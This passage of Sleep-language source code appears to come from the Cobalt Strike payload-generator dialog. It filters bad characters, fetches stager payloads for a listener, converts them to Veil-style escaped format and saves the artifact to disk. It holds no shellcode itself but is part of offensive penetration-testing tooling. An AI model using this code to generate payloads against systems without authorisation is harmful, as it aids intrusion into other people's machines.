				if (%o['BadChars'] !ismatch '[\\\\x0-9a-fA-F]+') {
					showError("Invalid BadChars format. Use: \\x00\\xff");
					return;
				}

				$candidates = split('\\\x', %o['BadChars']);
				shift($candidates);
				foreach $byte ($candidates) {
					$byte = chr(parseNumber($byte, 16));
				}
				%o['BadChars'] = join("", $candidates);
			}

			# find our listener.
			$payload = fixListenerOptions(%o);
			if ($payload is $null) {
				showError("Couldn't find listener:\n" . %o['listener']);
				return;
			}

			# ask the user where they want to save it
			saveFile2($this, $sel => "artifact");
			yield;
			$file = $1;

			# generate our payload
			if (%o['Format'] eq 'veil') {
				%o['Format'] = 'raw';
				call_async_callback($client, "module.execute", $this, "payload", $payload, %o);
				yield;
				$data = convertAll($1)['payload'];

				# convert to Veil format
				local('$buffer $x $f');
				$buffer = allocate(strlen($data) * 4);
				for ($x = 0; $x < strlen($data); $x++) {
					writeb($buffer, "\\x");
					$f = formatNumber(byteAt($data, $x), 10, 16);

					if (strlen($f) == 2) {
						writeb($buffer, $f);
					}
					else {
						writeb($buffer, "0 $+ $f");
					}
				}
				closef($buffer);

				$data = %(payload => readb($buffer, -1));
				closef($buffer);
			}
			else {
				call_async_callback($client, "module.execute", $this, "payload", $payload, %o);
				yield;
				$data = convertAll($1);
			}

			# if there's an error, let the user know.
			if ('error' in $data) {
				showError($data['error']);
				return;
			}

			# ok, save the payload and let the user know
			$handle = openf("> $+ $file");
			writeb($handle, $data['payload']);
			closef($handle);

			showError("Saved " . %o['output'] . " to\n $+ $file");
		}, %o => $1, $e => $2, \$dialog)];
	}, \$dialog));
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-payload-generator")];

	#
	# display the form...
	#
	[$dialog add: description("This dialog generates a payload to stage a Cobalt Strike listener. Several output options are available."), [BorderLayout NORTH]];
	[$dialog add: $a, [BorderLayout CENTER]];
	[$dialog add: center($generate, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

# extractResource("internal-path", "external-path")
sub extractResource {
	local('$handle $data $file');

	$handle = [SleepUtils getIOHandle: resource($1), $null];
	$data = readb($handle, -1);
	closef($handle);

	if (!-exists getFileParent($2)) {
		mkdir(getFileParent($2));
	}

	$handle = openf("> $+ $2");
	writeb($handle, $data);
	closef($handle);
}
